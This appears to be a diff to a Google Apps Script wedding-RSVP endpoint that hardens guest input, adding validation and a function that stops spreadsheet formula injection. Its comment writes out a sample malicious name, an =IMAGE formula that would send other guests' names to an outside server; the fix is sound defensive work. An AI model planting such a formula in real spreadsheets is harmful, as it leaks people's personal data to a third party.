@@ -23,14 +23,16 @@ function doPost(e) {
   lock.waitLock(10000) // два гостя одновременно не перезапишут друг друга
   try {
     const data = JSON.parse(e.postData.contents)
-    const name = String(data.name || '').trim().slice(0, 200)
-    const attend = ATTEND[data.attend]
+    const name = asText(String(data.name || '').replace(/[\u0000-\u001f]/g, ' ').trim().slice(0, 200))
+    const attend = Object.prototype.hasOwnProperty.call(ATTEND, data.attend) ? ATTEND[data.attend] : null
+    // id is a random UUID made by the guest's browser
+    const id = /^[A-Za-z0-9-]{8,64}$/.test(data.id) ? data.id : ''
     if (!name || !attend) return reply({ ok: false, error: 'bad request' })
 
     const sheet = getSheet()
-    const row = [new Date(), name, attend[0], attend[1], attend[2], data.id || '']
+    const row = [new Date(), name, attend[0], attend[1], attend[2], id]
 
-    const existing = data.id ? findRow(sheet, data.id) : 0
+    const existing = id ? findRow(sheet, id) : 0
     if (existing) sheet.getRange(existing, 1, 1, row.length).setValues([row])
     else sheet.appendRow(row)
 
@@ -68,6 +70,14 @@ function findRow(sheet, id) {
   const ids = sheet.getRange(2, HEADERS.length, last - 1, 1).getValues()
   for (let i = 0; i < ids.length; i++) if (ids[i][0] === id) return i + 2
   return 0
+}
+
+/**
+ * Text that Sheets would run as a formula (=, +, -, @) is stored as plain text: otherwise a "name" like
+ * =IMAGE("https://…/?"&B2:B50) would send other guests' names to someone's server when the sheet is opened.
+ */
+function asText(s) {
+  return /^[=+\-@]/.test(s) ? "'" + s : s
 }
 
 function reply(obj) {
